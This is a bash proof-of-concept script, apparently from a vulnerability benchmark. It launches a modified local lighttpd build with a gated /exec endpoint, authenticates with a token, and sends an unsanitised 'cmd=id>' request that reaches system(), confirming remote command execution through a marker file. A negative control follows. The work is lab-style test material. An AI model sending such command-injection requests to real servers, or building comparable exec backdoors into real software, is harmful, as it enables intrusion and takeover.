#!/usr/bin/env bash
# PoC for 170_lighttpd_C3I3S1
# Axes: C3 (config file + runtime state) / I3 (struct dispatch) / S1 (no sanitization)
#
# Gate: exec_mode from --exec-config AND /exec/init?token= must be called first.
# S1: no sanitization at all.
# I3: cmd flows via exec_args_t struct to dispatch_exec() -> system().
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lighttpd"
WWWROOT="/tmp/poc_170_www"
MARKER="/tmp/poc_170_marker"
PORT=18170
NEG_PORT=19170
CONF="/tmp/poc_170.conf"
EXEC_CONF="/tmp/poc_170_exec.conf"
SECRET="s3cr3t170"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$CONF" <<CONFEOF
server.port = $PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
exec_secret = $SECRET
CONFEOF

echo "[*] starting lighttpd with --exec-config on port $PORT..."
"$BINARY" -f "$CONF" -D --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 0.4

# Step 1: Initialize
echo "[*] step 1: initializing with token..."
INIT_CODE=$(python3 -c "
import socket
s = socket.socket()
s.connect(('127.0.0.1', $PORT))
s.sendall(b'GET /exec/init?token=${SECRET} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n')
resp = s.recv(4096).decode('utf-8', errors='replace')
s.close()
code = resp.split()[1] if len(resp.split()) > 1 else 'UNKNOWN'
print(code)
" 2>/dev/null || echo "UNKNOWN")
echo "[*] /exec/init returned: $INIT_CODE"
if [[ "$INIT_CODE" != "200" ]]; then
    echo "[-] init failed with code $INIT_CODE"
    exit 1
fi

# Step 2: Exploit — S1, no sanitization; I3 struct dispatch
echo "[*] step 2: sending exploit (S1 — no sanitization): cmd=id>${MARKER}"
python3 -c "
import socket, time
s = socket.socket()
s.connect(('127.0.0.1', $PORT))
req = ('GET /exec?cmd=id>${MARKER} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n').encode()
s.sendall(req)
time.sleep(0.3)
s.recv(4096)
s.close()
"
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null; SERVER_PID=0

NEG_CONF="/tmp/poc_170_neg.conf"
cat > "$NEG_CONF" <<CONFEOF
server.port = $NEG_PORT
server.document-root = "$WWWROOT"
server.http-parseopts = ("url-normalize" => "disable")
CONFEOF

"$BINARY" -f "$NEG_CONF" -D &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(python3 -c "
import socket
s = socket.socket()
s.connect(('127.0.0.1', $NEG_PORT))
s.sendall(b'GET /exec?cmd=id HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n')
resp = s.recv(4096).decode('utf-8', errors='replace')
s.close()
code = resp.split()[1] if len(resp.split()) > 1 else 'UNKNOWN'
print(code)
" 2>/dev/null || echo "UNKNOWN")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
rm -f "$NEG_CONF"

if [[ "$HTTP_CODE" == "404" || "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got $HTTP_CODE without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404/403)"
fi
